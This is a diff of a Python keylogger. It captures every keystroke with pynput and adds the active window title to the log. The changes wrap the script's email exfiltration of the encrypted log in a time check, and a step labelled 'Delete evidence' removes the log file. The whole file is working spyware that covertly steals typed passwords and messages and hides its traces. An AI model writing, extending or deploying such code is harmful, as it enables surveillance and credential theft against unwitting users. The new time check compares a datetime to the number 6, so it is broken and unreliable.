@@ -3,7 +3,7 @@ from pynput import keyboard
 import os
 import datetime as dt
 import threading
-import requests
+import pyautogui
 
 import smtplib
 from email.mime.text import MIMEText
@@ -62,6 +62,7 @@ def send_email(sender, recipient, subject, body, smtp_server, smtp_port, usernam
 
 def on_press(key):
     global string
+
     try:
         if key == keyboard.Key.enter:
             string += "\n"
@@ -79,6 +80,7 @@ def on_press(key):
             string = string[:-1]
         elif key == keyboard.Key.esc:
             return False
+
         else:
             string += str(key).replace("'", "")
     except AttributeError:
@@ -97,7 +99,8 @@ def log_data():
     threading.Timer(5.0, log_data).start()  # schedule next execution in 5 seconds
     with open('data.txt', 'a') as f:
         timestamp = dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
-        f.write(f'{timestamp}: {string}\n')
+        window = pyautogui.getActiveWindowTitle()
+        f.write(f'{timestamp}: {window} > {string}\n')
         string = ""
 
 
@@ -111,6 +114,7 @@ with keyboard.Listener(
         on_release=on_release) as listener:
     listener.join()
 
+
 # Read log file first then encrypt
 with open('data.txt', 'rb') as f:
     plaintext = f.read()
@@ -122,9 +126,12 @@ with open('encrypted.txt', 'wb') as f:
 
 filename = os.path.basename(encrypted_path)
 
-send_email(
-    sender, recipient, subject, body, smtp_server, smtp_port, username, password, filename, encrypted_path
-)
+current_time = dt.datetime.now()
+if current_time == 6:
+    send_email(
+        sender, recipient, subject, body, smtp_server, smtp_port, username, password, filename, encrypted_path
+    )
+
 
 # Delete evidence
 os.remove(file_path + "\\data.txt")
